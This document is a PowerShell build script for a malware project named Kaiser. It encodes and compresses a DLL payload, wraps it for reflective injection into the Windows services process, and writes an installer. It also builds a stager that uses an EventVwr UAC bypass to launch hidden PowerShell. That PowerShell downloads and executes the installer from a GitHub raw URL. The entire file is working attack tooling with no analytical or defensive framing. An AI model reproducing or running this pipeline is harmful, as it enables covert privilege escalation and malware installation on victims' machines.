# First we need to read Kaiser payload
# TODO: Change to .dll
Write-Verbose "[*] Reading Kaiser payload..."
$bytes = [System.IO.File]::ReadAllBytes(".\Release\Kaiser.dll")

# Base64 encode
$encoded = [Convert]::ToBase64String($bytes)

# Now wrap around Invoke-ReflectivePEInjection.ps1
# Read Invoke-ReflectivePEInjection.ps1
$injector = [IO.File]::ReadAllText(".\Invoke-ReflectivePEInjection.ps1")

$payload = $injector

# Append payload into file
$payload += ';' + '$PEBytes = [Convert]::FromBase64String("' + $encoded + '");'

# Write the command for Invoke-ReflectivePEInjection.ps1
# We want to inject into the second csrss SessionId
$payload += "`n" + 'Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName services'
#$payload | Out-File -Encoding Unicode -FilePath ".\Payload.ps1" -Force

$payload = [System.Text.Encoding]::Unicode.GetBytes($payload)

# Compress the payload
Write-Verbose "[*] Compressing..."    
$memstream = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream $memstream, ([IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($payload, 0, $payload.Length)
$gzipStream.Close()
$memstream.Close()
$compressed = $memstream.ToArray()

$encoded = [Convert]::ToBase64String($compressed)


<#
# Compress the payload
Write-Verbose "[*] Compressing..."    
$memstream = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream $memstream, ([IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($payload, 0, $bytes.payload)
$gzipStream.Close()
$memstream.Close()
$compressed = $memstream.ToArray()

# Base64 encode
$encoded = [Convert]::ToBase64String($compressed)

$out = 'iex New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream($(New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String($encoded))), [IO.Compression.CompressionMode]::Decompress))).ReadToEnd()'

#$command = 'powershell.exe -nop -w Hidden –ExecutionPolicy Bypass -c iex ''' + $payload + ''''
#>

# Write it out to a file that can be downloaded and executed.
$installer = '$cmd = powershell.exe -enc ' + $encoded + "`n`n"
$installer += [IO.File]::ReadAllText(".\Install-Kaiser.ps1")
$installer | Out-File -FilePath ".\Installer.ps1" -Force

# Here we want to set up stager script to bypass UAC and then download/execute the above script.
$uacbypass = [IO.File]::ReadAllText(".\Invoke-EventVwrBypass.ps1")
$uacbypass | Out-File -Encoding Unicode -FilePath ".\Stager.ps1" -Force

# This is the downloader code.
# $source contains the URL of Installer.ps1.
$downloader = @'
iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NtRaiseHardError/Kaiser/Installer/Installer.ps1")
'@

$bypasscmd = 'Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w Hidden –ep Bypass -enc ' + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($downloader)) + '"'
$bypasscmd | Out-File -Append -Encoding Unicode -FilePath ".\Stager.ps1" -Force